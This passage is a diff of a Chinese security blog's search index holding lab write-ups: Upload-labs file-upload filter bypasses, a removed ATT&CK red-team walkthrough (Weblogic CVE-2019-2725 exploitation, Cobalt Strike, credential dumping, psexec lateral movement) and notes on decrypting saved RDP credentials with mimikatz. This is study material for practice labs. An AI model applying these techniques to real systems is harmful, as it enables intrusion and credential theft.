@@ -1,6 +1,79 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Upload-labs通关笔记</title>
+    <url>/2020/10/23/Upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<blockquote>
+<p><a href="https://github.com/c0ny1/upload-labs">项目地址</a></p>
+<p><code>Pass01-16</code></p>
+</blockquote>
+<h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p><code>F12前端修改 console控制台执行 文件上传成功</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220158338.png" alt="image-20201020220158338"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220215601.png" alt="image-20201020220215601"></p>
+<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220651159.png" alt="image-20201020220651159"></p>
+<p>修改<code>content-type</code> 绕过</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220825829.png" alt="image-20201020220825829"></p>
+<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221049267.png" alt="image-20201020221049267"></p>
+<p><code>phtml绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221208589.png" alt="image-20201020221208589"></p>
+<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221427410.png" alt="image-20201020221427410"></p>
+<p><code>上传 .htaccess绕过</code></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221604088.png" alt="image-20201020221604088"></p>
+<p><code>这样所有的文件都会被解析成php</code></p>
+<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020223052144.png" alt="image-20201020223052144"></p>
+<p><code>后缀名中加空绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020223033471.png" alt="image-20201020223033471"></p>
+<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021220855332.png" alt="image-20201021220855332"></p>
+<p><code>文件名大小写绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021220937946.png" alt="image-20201021220937946"></p>
+<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221216989.png" alt="image-20201021221216989"></p>
+<p><code>后缀名加空绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221206692.png" alt="image-20201021221206692"></p>
+<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221523966.png" alt="image-20201021221523966"></p>
+<p><code>后缀名加 . 绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221609821.png" alt="image-20201021221609821"></p>
+<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221721305.png" alt="image-20201021221721305"></p>
+<p><code>::$DATA 绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221857626.png" alt="image-20201021221857626"></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021222129072.png" alt="image-20201021222129072"></p>
+<p><code>构造 .(空格). 绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021222348939.png" alt="image-20201021222348939"></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223210264.png" alt="image-20201021223210264"></p>
+<p><code>构造后缀名双写绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223257857.png" alt="image-20201021223257857"></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223427062.png" alt="image-20201021223427062"></p>
+<p><code>get方式 %00 截断绕过 </code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021224644694.png" alt="image-20201021224644694"></p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021224920223.png" alt="image-20201021224920223"></p>
+<p><code>post %00截断</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225033720.png" alt="image-20201021225033720"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225107502.png" alt="image-20201021225107502"></p>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225848280.png" alt="image-20201021225848280"></p>
+<p><code>生成图片木马上传</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225919035.png" alt="image-20201021225919035"></p>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023141301726.png" alt="image-20201023141301726"></p>
+<p><code>这一关用 getimagesize获取文件类型</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023141519268.png" alt="image-20201023141519268"></p>
+<blockquote>
+<p>如果上传的不是图像，<code>getimagesize()</code>就会返回<code>FALSE</code> 这里继续用<code>图片马</code>+<code>GIF89A</code>文件头绕过</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023142226024.png" alt="image-20201023142226024"></p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023142550074.png" alt="image-20201023142550074"></p>
+<p><code>这一关用php_exif模块来判断类型，继续用图片马即可绕过</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023143023208.png" alt="image-20201023143023208"></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>上传绕过</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ATT&amp;CK红队实战(一)</title>
     <url>/2021/03/06/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%B8%80)/</url>
     <content><![CDATA[<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶场地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
@@ -187,242 +260,6 @@
         <tag>红队</tag>
         <tag>域</tag>
         <tag>攻防</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ATT&amp;CK红队实战(二)</title>
-    <url>/2021/03/30/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)/</url>
-    <content><![CDATA[<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶场地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
-<h3 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h3><blockquote>
-<p>内网网段 192.168.100.0/24</p>
-<p>外网网段 10.7.0.0/16</p>
-</blockquote>
-<ul>
-<li>WEB（双网卡）<ul>
-<li>IP: 192.168.100.129    (仅主机)</li>
-<li>IP: 10.7.7.14 (桥接)</li>
-</ul>
-</li>
-<li>PC：（双网卡）<ul>
-<li>IP：192.168.100.130（仅主机）</li>
-<li>IP：10.7.7.15(桥接)</li>
-</ul>
-</li>
-<li>DC：<ul>
-<li>IP：192.168.100.134（仅主机）</li>
-</ul>
-</li>
-<li>Kali：<ul>
-<li>IP：10.7.7.7（桥接）</li>
-</ul>
-</li>
-</ul>
-<h3 id="网络测试"><a href="#网络测试" class="headerlink" title="网络测试"></a>网络测试</h3><p>最终实现所有网络互通，<code>WEB</code>和<code>PC</code>都能上网且ping得通<code>DC</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329144425454.png" alt="image-20210329144425454"></p>
-<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
-<li>主机发现</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 10.7.0.0&#x2F;16</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329145021760.png" alt="image-20210329145021760"></p>
-<ul>
-<li>漏洞扫描</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -n -sV 10.7.7.14</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329145518651.png" alt="image-20210329145518651"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
-<p>发现靶机开放7001端口的Weblogic 服务，使用WeblogicScan.py 扫描</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python WeblogicScan.py <span class="number">10.7</span><span class="number">.7</span><span class="number">.14</span> <span class="number">7001</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329195505233.png" alt="image-20210329195505233"></p>
-<blockquote>
-<p>发现<code>CVE-2019-2725</code>漏洞存在,攻击利用</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;misc&#x2F;weblogic_deserialize_asyncresponseservice</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>把选项都设置好</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329195923008.png" alt="image-20210329195923008"></p>
-<blockquote>
-<p>攻击利用</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329200050880.png" alt="image-20210329200050880"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329200116102.png" alt="image-20210329200116102"></p>
-<blockquote>
-<p>接下来上线CS然后<code>Bypass UAC</code></p>
-</blockquote>
-<ul>
-<li>CS生成一段攻击载荷</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201125834.png" alt="image-20210329201125834"></p>
-<ul>
-<li>这里的靶机是64位的所以要勾上<code>Use x64 payload</code></li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201232926.png" alt="image-20210329201232926"></p>
-<ul>
-<li>靶机上执行</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201455408.png" alt="image-20210329201455408"></p>
-<ul>
-<li>CS主机上线</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201543198.png" alt="image-20210329201543198"></p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">shell <span class="built_in">ipconfig</span> /all</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201833526.png" alt="image-20210329201833526"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201857899.png" alt="image-20210329201857899"></p>
-<ul>
-<li>存活主机发现</li>
-</ul>
-<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329201957129.png" alt="image-20210329201957129"></p>
-<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">portscan</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329202243388.png" alt="image-20210329202243388"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329202742789.png" alt="image-20210329202742789"></p>
-<ul>
-<li>查看扫描到的主机</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329203023097.png" alt="image-20210329203023097"></p>
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><code>bypassuac</code>:将本地中管理员权限提升至高级管理员权限</p>
-<p><code>spawns</code>：使用其它用户的凭证来以其它用户身份派生一个会话，这个命令派生一个临时进程并将payload stage 注入进那个进程</p>
-<ul>
-<li>先生成一个<code>SMB</code>的监听</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210329203626702.png" alt="image-20210329203626702"></p>
-<ul>
-<li>提取密码</li>
-</ul>
-<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083409823.png" alt="image-20210330083409823"></p>
-<ul>
-<li>这里来查看破解的密码</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083506753.png" alt="image-20210330083506753"></p>
-<ul>
-<li><code>Spawn As</code> 派生一个<code>SMB</code></li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330083809217.png" alt="image-20210330083809217"></p>
-<ul>
-<li>进入<code>Target</code>使用<code>psexec</code>来提升权限</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084102060.png" alt="image-20210330084102060"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084241250.png" alt="image-20210330084241250"></p>
-<ul>
-<li>已提升至<code>SYSTEM</code>权限</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084414521.png" alt="image-20210330084414521"></p>
-<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><ul>
-<li>通过之前<code>net view</code>/<code>Port scan</code> 扫描到了内网还有两台主机</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330084903046.png" alt="image-20210330084903046"></p>
-<h3 id="横向提权"><a href="#横向提权" class="headerlink" title="横向提权"></a>横向提权</h3><blockquote>
-<p>Administrator是域管理员，使用<code>pxexec</code>凭证来登陆其它两台主机</p>
-</blockquote>
-<ul>
-<li>登陆PC</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095224253.png" alt="image-20210330095224253"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095304886.png" alt="image-20210330095304886"></p>
-<p>主机上线</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095552574.png" alt="image-20210330095552574"></p>
-<ul>
-<li>登陆DC</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095827436.png" alt="image-20210330095827436"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330095910259.png" alt="image-20210330095910259"></p>
-<p>主机上线</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100014169.png" alt="image-20210330100014169"></p>
-<p>至此三台主机全部拿下，且都是<code>SYSTEM</code>权限</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100450381.png" alt="image-20210330100450381"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>先是通过攻击WEB这台机子然后进入内网横向移动再提权，最终所有主机都成功上线。</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210330100401754.png" alt="image-20210330100401754"></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>域</tag>
-        <tag>攻防</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Upload-labs通关笔记</title>
-    <url>/2020/10/23/Upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<blockquote>
-<p><a href="https://github.com/c0ny1/upload-labs">项目地址</a></p>
-<p><code>Pass01-16</code></p>
-</blockquote>
-<h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p><code>F12前端修改 console控制台执行 文件上传成功</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220158338.png" alt="image-20201020220158338"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220215601.png" alt="image-20201020220215601"></p>
-<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220651159.png" alt="image-20201020220651159"></p>
-<p>修改<code>content-type</code> 绕过</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020220825829.png" alt="image-20201020220825829"></p>
-<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221049267.png" alt="image-20201020221049267"></p>
-<p><code>phtml绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221208589.png" alt="image-20201020221208589"></p>
-<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221427410.png" alt="image-20201020221427410"></p>
-<p><code>上传 .htaccess绕过</code></p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020221604088.png" alt="image-20201020221604088"></p>
-<p><code>这样所有的文件都会被解析成php</code></p>
-<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020223052144.png" alt="image-20201020223052144"></p>
-<p><code>后缀名中加空绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201020223033471.png" alt="image-20201020223033471"></p>
-<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021220855332.png" alt="image-20201021220855332"></p>
-<p><code>文件名大小写绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021220937946.png" alt="image-20201021220937946"></p>
-<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221216989.png" alt="image-20201021221216989"></p>
-<p><code>后缀名加空绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221206692.png" alt="image-20201021221206692"></p>
-<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221523966.png" alt="image-20201021221523966"></p>
-<p><code>后缀名加 . 绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221609821.png" alt="image-20201021221609821"></p>
-<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221721305.png" alt="image-20201021221721305"></p>
-<p><code>::$DATA 绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021221857626.png" alt="image-20201021221857626"></p>
-<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021222129072.png" alt="image-20201021222129072"></p>
-<p><code>构造 .(空格). 绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021222348939.png" alt="image-20201021222348939"></p>
-<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223210264.png" alt="image-20201021223210264"></p>
-<p><code>构造后缀名双写绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223257857.png" alt="image-20201021223257857"></p>
-<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021223427062.png" alt="image-20201021223427062"></p>
-<p><code>get方式 %00 截断绕过 </code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021224644694.png" alt="image-20201021224644694"></p>
-<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021224920223.png" alt="image-20201021224920223"></p>
-<p><code>post %00截断</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225033720.png" alt="image-20201021225033720"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225107502.png" alt="image-20201021225107502"></p>
-<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225848280.png" alt="image-20201021225848280"></p>
-<p><code>生成图片木马上传</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201021225919035.png" alt="image-20201021225919035"></p>
-<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023141301726.png" alt="image-20201023141301726"></p>
-<p><code>这一关用 getimagesize获取文件类型</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023141519268.png" alt="image-20201023141519268"></p>
-<blockquote>
-<p>如果上传的不是图像，<code>getimagesize()</code>就会返回<code>FALSE</code> 这里继续用<code>图片马</code>+<code>GIF89A</code>文件头绕过</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023142226024.png" alt="image-20201023142226024"></p>
-<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023142550074.png" alt="image-20201023142550074"></p>
-<p><code>这一关用php_exif模块来判断类型，继续用图片马即可绕过</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201023143023208.png" alt="image-20201023143023208"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>上传绕过</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -690,6 +527,312 @@
       </tags>
   </entry>
   <entry>
+    <title>【内网渗透学习笔记】05、获取Winodws的远程连接记录</title>
+    <url>/2021/04/07/intranet05/</url>
+    <content><![CDATA[<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><blockquote>
+<p>在使用mstsc连接的时候，管理员勾选了自动保存密码连接的选项</p>
+</blockquote>
+<h2 id="获得远程桌面连接历史记录"><a href="#获得远程桌面连接历史记录" class="headerlink" title="获得远程桌面连接历史记录"></a>获得远程桌面连接历史记录</h2><ul>
+<li>获得当前用户的历史记录</li>
+</ul>
+<blockquote>
+<p>注册表 <code>HKCU:\Software\Microsoft\Terminal Server Client\Servers</code></p>
+</blockquote>
+<p>每个注册表的项保存着连接的服务器地址，键值<code>UsernameHine</code>对应登陆用户名</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140054423.png" alt="image-20210407140054423"></p>
+<h2 id="获得远程桌面连接的密码"><a href="#获得远程桌面连接的密码" class="headerlink" title="获得远程桌面连接的密码"></a>获得远程桌面连接的密码</h2><ul>
+<li>查看计算机的连接记录</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140453363.png" alt="image-20210407140453363"></p>
+<ul>
+<li>查找本地的证书</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140601500.png" alt="image-20210407140601500"></p>
+<ul>
+<li>使用<code>mimikatz</code></li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD<span class="number">155</span>F<span class="number">4888</span>E<span class="number">9</span>DB<span class="number">9</span>D<span class="number">7</span>FE<span class="number">4</span>C<span class="number">235728</span>F<span class="number">8</span>C</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407140830258.png" alt="image-20210407140830258"></p>
+<blockquote>
+<p>把<code>guimasterkey</code>记下来</p>
+</blockquote>
+<ul>
+<li>使用 <code>::dpapi</code></li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407141038260.png" alt="image-20210407141038260"></p>
+<blockquote>
+<p>根据我们刚刚的<code>guimasterkey</code>得到<code>MasterKey</code></p>
+</blockquote>
+<ul>
+<li>最后就可以把密码解密了</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD155F4888E9DB9D7FE4C235728F8C /masterkey:<span class="number">2</span>a1142391cf8bdacf5d93d267f0b8c8ebcf2016a37c5da0efe20b45c5a31b4f91cc4f3438af5ce969f3ac42a3d5e70b15e94df927b457a6c1647c2ce96dd4819</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142104997.png" alt="image-20210407142104997"></p>
+<h2 id="从注册表中删除RDP连接缓存"><a href="#从注册表中删除RDP连接缓存" class="headerlink" title="从注册表中删除RDP连接缓存"></a>从注册表中删除RDP连接缓存</h2><ul>
+<li>运行(regedit.exe)并到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client</code> ;</li>
+</ul>
+<blockquote>
+<p>需要删除两个注册表项：<code>默认</code>（存储的最近10个RDP连接记录）和服务器(包含所有用于登陆的RDP服务器和用户名列表)</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142745267.png" alt="image-20210407142745267"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142834238.png" alt="image-20210407142834238"></p>
+<blockquote>
